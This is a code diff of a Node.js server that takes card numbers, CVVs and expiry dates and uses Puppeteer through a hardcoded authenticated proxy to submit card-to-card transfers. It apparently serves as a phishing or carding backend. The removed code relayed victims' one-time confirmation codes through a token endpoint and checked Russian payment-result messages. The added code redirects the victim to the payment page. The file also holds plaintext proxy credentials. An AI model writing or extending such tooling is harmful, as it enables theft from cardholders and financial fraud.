@@ -21,7 +21,7 @@ app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json())
 app.use(cors())
 
-const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) => {
+const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
     await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
@@ -56,54 +56,12 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) =
 
     await page.waitForTimeout(5000);
 
-    const input = await page.$('input')
-    const a = await page.$eval('input', el => el.outerHTML)
-    console.log(a)
-
-    if(input) {
-      console.log("wait", id)
-      const locker = new EventEmitter();
-
-      const lockable = async () => {
-        const checker = () => {
-          setTimeout(() => obj[id] ? locker.emit('unlocked') : checker(), 1000)
-          if(obj[id]) return
-        }
-        await checker()
-        await new Promise(resolve => locker.once('unlocked', resolve));
-        return
-      }
-      await lockable()
-      console.log('successfully recieved', id)
-      input.type(obj[id])
-      console.log('entered')
-    }
-
-    try { 
-
-      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
-         const isOne = !!(await page.$x('//*[contains(text(), "Платеж проведен")]')).length
-         console.log(isOne)
-         await browser.close()
-         return isOne ? 1 : 0
-      }
-     } catch (e) {
-         await browser.close()
-         return 0
-     }
-     await browser.close()
+    return page.url()
 }
 app.post('/sendData', async (req, res) => {
-        const {toCard,amount, fromCard, cvv, expireDate, email, id} = req.body
-        obj[id] = null
-        const result = await write_data(toCard,amount, fromCard, cvv, expireDate, email, id)
-        return res.status(200).json({ok: !!result, id})
-})
-
-app.get('/token/:id/:code', async (req, res) => {
-  const {id, code} = req.params
-  obj[id] = code
-  return res.status(200).send()
+        const {toCard,amount, fromCard, cvv, expireDate, email} = req.body
+        const url = await write_data(toCard,amount, fromCard, cvv, expireDate, email)
+        return res.redirect(url)
 })
 
 app.listen(5000)
